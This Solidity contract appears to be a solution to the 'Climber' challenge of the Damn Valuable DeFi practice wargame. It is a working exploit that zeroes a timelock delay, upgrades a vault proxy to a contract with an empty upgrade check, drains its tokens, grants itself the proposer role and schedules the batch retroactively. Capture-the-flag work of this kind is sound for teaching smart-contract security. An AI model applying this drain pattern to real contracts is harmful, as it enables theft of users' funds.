// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {ClimberTimelock} from "./ClimberTimelock.sol";
import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
import {PROPOSER_ROLE} from "./ClimberConstants.sol";

contract MaliciousClimber is UUPSUpgradeable {
    function sendFundsToRecovery(address recovery, address token, uint256 amount) public {
        DamnValuableToken(token).transfer(recovery, amount);
    }

    function scheduleOp(address payable timelock, address vault, address recovery, address token, uint256 amount)
        public
    {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory calldataElements = new bytes[](4);
        bytes32 salt = bytes32("0x");

        targets[0] = address(timelock);
        values[0] = 0;
        calldataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, uint64(0));

        targets[1] = address(vault);
        values[1] = 0;
        calldataElements[1] = abi.encodeWithSelector(
            UUPSUpgradeable.upgradeToAndCall.selector,
            address(this),
            abi.encodeWithSelector(this.sendFundsToRecovery.selector, address(recovery), address(token), amount)
        );

        targets[2] = address(timelock);
        values[2] = 0;
        calldataElements[2] = abi.encodeWithSelector(AccessControl.grantRole.selector, PROPOSER_ROLE, address(this));

        targets[3] = address(this);
        values[3] = 0;
        calldataElements[3] = abi.encodeWithSelector(this.scheduleOp.selector, timelock, vault, recovery, token, amount);

        ClimberTimelock(timelock).schedule(targets, values, calldataElements, salt);
    }

    function _authorizeUpgrade(address newImplementation) internal override {}
}
